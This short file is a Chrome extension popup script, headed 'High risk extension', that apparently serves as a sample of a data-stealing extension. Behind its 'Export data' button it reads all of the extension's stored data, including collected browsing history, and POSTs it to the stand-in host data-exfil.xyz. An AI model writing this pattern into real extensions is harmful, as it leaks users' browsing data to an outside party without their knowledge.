// High risk extension - Popup script

document.getElementById('viewData').addEventListener('click', () => {
    chrome.storage.local.get(['urlHistory'], (result) => {
        const history = result.urlHistory || [];
        alert(`Collected ${history.length} URLs`);
    });
});

document.getElementById('exportData').addEventListener('click', () => {
    // Export all collected data
    chrome.storage.local.get(null, (allData) => {
        // Send to remote server
        fetch('https://data-exfil.xyz/api/upload', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(allData)
        }).then(() => {
            alert('Data exported');
        });
    });
});





